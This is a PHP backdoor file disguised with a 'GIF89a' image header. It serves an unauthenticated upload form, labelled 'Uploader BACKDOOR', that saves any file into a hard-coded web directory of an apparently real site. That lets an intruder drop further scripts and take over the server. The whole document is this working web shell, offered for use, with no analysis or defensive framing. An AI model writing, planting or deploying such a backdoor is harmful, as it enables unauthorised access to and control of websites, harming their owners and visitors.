GIF89a;
<?php
$targetDir = '/storage/home/srv20850/basegroup.su/';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $uploadedFile = $_FILES['file'];

    if ($uploadedFile['error'] === UPLOAD_ERR_OK) {
        $fileName = basename($uploadedFile['name']);
        $targetPath = $targetDir . $fileName;

        // Move uploaded file to target directory
        if (move_uploaded_file($uploadedFile['tmp_name'], $targetPath)) {
            echo "File uploaded successfully :) ";
        } else {
            echo "Failed to move uploaded file.";
        }
    } else {
        echo "Error occurred while uploading file.";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>File Upload Backdoor</title>
</head>
<body>
    <h2>Uploader BACKDOOR</h2>
    <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" enctype="multipart/form-data">
        <input type="file" name="file">
        <button type="submit">Upload</button>
    </form>
</body>
</html>